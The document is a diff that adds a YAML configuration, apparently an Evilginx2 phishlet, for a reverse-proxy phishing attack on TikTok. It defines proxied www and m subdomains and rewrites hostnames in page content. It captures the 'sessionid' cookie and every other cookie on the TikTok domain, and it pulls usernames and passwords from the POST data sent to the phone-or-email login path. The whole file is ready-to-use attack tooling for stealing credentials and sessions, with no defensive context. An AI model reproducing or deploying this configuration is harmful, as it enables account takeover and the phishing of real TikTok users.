@@ -1,0 +1,24 @@
+author: '@An0nUD4Y'
+min_ver: '2.3.0'
+proxy_hosts:
+  - {phish_sub: 'www', orig_sub: 'www', domain: 'tiktok.com', session: true, is_landing: true}
+  - {phish_sub: 'm', orig_sub: 'm', domain: 'tiktok.com', session: true, is_landing: false}
+sub_filters:
+  - {triggers_on: 'www.tiktok.com', orig_sub: 'www', domain: 'tiktok.com', search: 'https://{hostname}/', replace: 'https://{hostname}/', mimes: ['text/html', 'application/json']}
+  - {triggers_on: 'm.tiktok.com', orig_sub: 'm', domain: 'tiktok.com', search: 'https://{hostname}/', replace: 'https://{hostname}/', mimes: ['text/html', 'application/json', 'application/x-javascript']}
+  - {triggers_on: 'm.tiktok.com', orig_sub: 'm', domain: 'tiktok.com', search: '''{domain}'';', replace: '''{domain}'';', mimes: ['text/html', 'application/json', 'application/x-javascript']}
+auth_tokens:
+  - domain: '.tiktok.com'
+    keys: ['sessionid','.*,regexp']
+credentials:
+  username:
+    key: '&mobile='
+    search: '(.*)'
+    type: 'post'
+  password:
+    key: 'pass'
+    search: '(.*)'
+    type: 'post'
+login:
+  domain: 'www.tiktok.com'
+  path: '/login/phone_or_email'
